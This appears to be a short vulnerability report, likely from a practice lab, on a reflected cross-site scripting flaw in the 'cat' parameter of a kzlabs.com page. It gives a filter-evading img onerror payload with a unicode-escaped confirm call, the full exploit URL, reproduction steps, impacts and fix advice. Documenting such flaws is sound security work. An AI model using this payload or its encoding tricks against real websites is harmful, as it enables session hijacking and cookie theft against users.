# Reflected Cross-Site Scripting (XSS) via `cat` Parameter

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `cat` parameter of the application. User-supplied input is reflected into the response without proper sanitization, allowing arbitrary JavaScript execution in the victim’s browser.

---

## Vulnerable Endpoint

```text id="m7q2xz"
http://kzlabs.com/punishment/29.php?cat=%3CiMg%20src=x%20onerror=%5Cu0063onfirm?.(1)%3E
```

---

## Vulnerable Parameter

```text id="r4k8vn"
cat
```

---

## Payload Used

```html id="y1d6pl"
<iMg src=x onerror=\u0063onfirm?.(1)>
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/punishment/29.php?cat=%3CiMg%20src=x%20onerror=%5Cu0063onfirm?.(1)%3E
   ```

2. Observe that the payload is reflected into the response.

3. The JavaScript executes automatically and triggers a popup dialog.

---

## Proof of Concept

```text id="u9c3be"
http://kzlabs.com/punishment/29.php?cat=%3CiMg%20src=x%20onerror=%5Cu0063onfirm?.(1)%3E
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/ac1d456e-43a6-47b0-b424-fa31679aee9f" />


---

## Impact

* Session hijacking
* Cookie theft
* JS execution

---

## Recommendations for Fix

* Encode output
* Validate input
* Secure rendering
